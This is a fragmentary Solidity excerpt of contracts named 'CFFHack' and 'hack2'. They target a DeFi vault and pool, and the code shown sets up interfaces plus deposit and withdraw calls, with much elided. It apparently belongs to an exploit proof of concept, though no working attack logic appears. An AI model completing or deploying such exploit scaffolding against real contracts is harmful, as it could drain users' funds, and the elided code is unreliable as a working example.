...
contract CFFHack{
    ...
    CFVaultInterface public cfVault;
    DAI public dai;
    CFVaultInterface public cfpool;
    ...
    constructor(CompoundInterface _cETH,
                ...
                CFVaultInterface _cfVault,
                CFVaultInterface _cfpool,
                LPToken _lp
               ) public{
        cETH = _cETH;
        cDAI = _cDAI;
    ...
    function withdraw(uint256 _amount) public {
        cfVault.withdraw(lp.balanceOf(address(this)));
    }
    //deposit test
    function supplyUSDC() public{
        // approve tokens
        dai.approve(address(cfVault),uint(-1));
        cfVault.deposit(getDAIBalance());
     }
...
contract hack2{
    CFVaultInterface public cfVault;
    constructor(CFVaultInterface _cfVault) public{
        cfVault = _cfVault;
    }
